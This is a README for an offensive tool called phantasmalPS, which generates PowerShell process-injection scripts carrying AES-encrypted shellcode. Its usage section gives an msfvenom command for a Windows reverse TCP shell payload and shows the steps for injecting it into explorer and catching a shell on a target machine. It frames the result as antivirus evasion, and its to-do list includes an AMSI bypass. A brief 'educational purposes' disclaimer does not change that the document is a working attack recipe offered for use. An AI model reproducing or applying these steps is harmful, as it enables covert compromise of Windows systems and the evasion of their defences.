# phantasmalPS
This Python script generates a PowerShell Process Injection script with AES encrypted shellcode.

## Disclaimer
This repository is for educational purposes only. Do not use on computers, servers or endpoints without authorization. I am not responsible for any damages you may cause. Use it at your own discretion.



## Simple Usage:
Let's start with installing the required libraries:
```python
pip3 install -r requirements.txt
```
```bash
python3 phantasmalPS.py -h
```
![Help](Images/phantasmalPS-help.png)

First generate a shellcode within your favorite C2 framework:
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport 8443 -f raw -o shell.bin
```
Let phantasmalPS do its magic:
```bash
python3 phantasmalPS.py -f shell.bin -p explorer
```
![Run](Images/run-phantasmalPS.png)

It generates a PowerShell file called "simplescript.ps1" n the same directory you downloaded phantasmalPS.py:
```bash
ls -l simplescript.ps1
```
![Attack](Images/file-check.png)

Now, transfer the PowerShell script to a Windows machine and get a shell back:

![Reverse Shell](Images/AV-evasion.png)

Thank you

## To-Do
- Add Amsi bypass
- Add more injection techniques
- Add more payload encryption techniques
